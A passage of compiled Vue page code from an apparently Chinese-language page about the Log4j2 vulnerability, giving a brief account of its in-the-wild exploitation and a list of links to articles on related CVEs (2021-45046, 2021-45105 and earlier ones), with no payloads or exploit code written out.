noreferrer"},X=n("p",null,[n("strong",null,"2.15.0版漏洞相关文章")],-1),Z={href:"https://cloud.tencent.com/developer/article/1919456",target:"_blank",rel:"noopener noreferrer"},nn={href:"https://blog.csdn.net/weixin_44047654/article/details/128300416",target:"_blank",rel:"noopener noreferrer"},an={href:"https://blog.csdn.net/mole_exp/article/details/122037039",target:"_blank",rel:"noopener noreferrer"},sn=n("p",null,[n("strong",null,"2.16.0版漏洞相关文章")],-1),tn={href:"https://blog.csdn.net/hilaryfrank/article/details/122046202",target:"_blank",rel:"noopener noreferrer"};function en(pn,on){const s=o("ExternalLinkIcon");return l(),c("div",null,[P,n("p",null,[a("至漏洞爆发开始，为了体现该漏洞的影响，甚至有了漏洞打地球的趣图，详情参考《"),n("a",T,[a("核弹级漏洞公开，昨晚你睡着了么？"),t(s)]),a("》，除了文中的还有入侵汽车、借用 WIFI 名称钓鱼的，从线上到线下广泛应用：")]),B,n("p",null,[a("随着漏洞的公开，在野利用该漏洞获取权限并进行挖矿勒索的案例已然出现，比如奇安信检测到的情况，详情"),n("a",U,[a("《警惕！Log4j2漏洞已被多个僵尸网络家族利用》"),t(s)]),a("，漏洞触发条件是在 url 中带入 payload：")]),R,n("p",null,[a("漏洞利用成功后会加入 SSH 公钥，这个特征还比较明显，容易拦截。比如绿盟科技检测到的情况，详情"),n("a",$,[a("《Log4j2修补时间差！挖矿软件和僵尸网络乘虚而入》"),t(s)]),a("，payload 及利用如图：")]),W,n("p",null,[n("a",H,[a("log4j2-入门简介"),t(s)])]),n("p",null,[n("a",Y,[a("log4j2介绍及配置"),t(s)])]),n("p",null,[n("a",G,[a("Log4j2日志框架"),t(s)])]),Q,n("p",null,[n("a",K,[a("Log4j反序列化分析(CVE-2019-17571&CVE-2017-5645)"),t(s)])]),X,n("p",null,[n("a",Z,[a("史上最全 log4j2 远程命令执行漏洞汇总报告"),t(s)])]),n("p",null,[n("a",nn,[a("Apache Log4j2 Lookup 代码执行与拒绝服务漏洞(CVE-2021-45046)"),t(s)])]),n("p",null,[n("a",an,[a("Log4j2 CVE-2021-45046 鸡肋RCE漏洞复现与浅析"),t(s)])]),sn,n("p",null,[n("a",tn,[a("Log4j2中2.16.0版中DOS攻击（CVE-2021-45105）的漏洞原理、复现步骤和修复方法(2.17.0修复原理)"),t(s)])])])}const un=p(V,[["render",en],["__file","log4j2 .html.vue"]]);export{un as default};
